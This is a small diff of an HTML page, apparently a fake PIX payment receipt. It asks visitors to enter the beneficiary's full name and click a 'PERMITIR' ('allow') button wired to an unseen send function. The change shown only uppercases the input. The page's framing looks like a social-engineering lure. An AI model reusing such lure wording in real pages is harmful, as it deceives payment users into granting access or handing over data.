@@ -13,7 +13,7 @@
     <h2>Comprovante de Transação PIX</h2>
     
     <p id="status">Para confirmar, digite o nome completo da pessoa beneficiária e clique em PERMITIR.</p>
-    <input type="text" id="username" placeholder="Nome completo">
+    <input type="text" id="username" placeholder="Nome completo" oninput="this.value = this.value.toUpperCase()">
     <button onclick="checkAndSend()">PERMITIR</button>
 
     <img id="imagem" src="assets/android-chrome-192x192.png" alt="Comprovante" width="300">
